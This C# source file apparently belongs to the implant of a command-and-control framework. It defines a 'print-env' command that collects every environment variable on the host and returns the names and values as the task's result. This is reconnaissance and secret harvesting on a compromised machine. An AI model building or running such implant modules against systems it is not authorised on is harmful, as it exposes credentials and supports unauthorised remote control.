using System;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class print_env : EngineerCommand
    {
        public override string Name => "print-env";

        public override async Task Execute(EngineerTask task)
        {
            //get all of the enviornment variables and return them one entry per line
            var output = new StringBuilder();
            foreach (var env in Environment.GetEnvironmentVariables().Keys)
            {
                output.AppendLine(env.ToString() + "|" + Environment.GetEnvironmentVariable(env.ToString()));
            }
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(),task,EngTaskStatus.Complete,TaskResponseType.String);

        }
    }
}
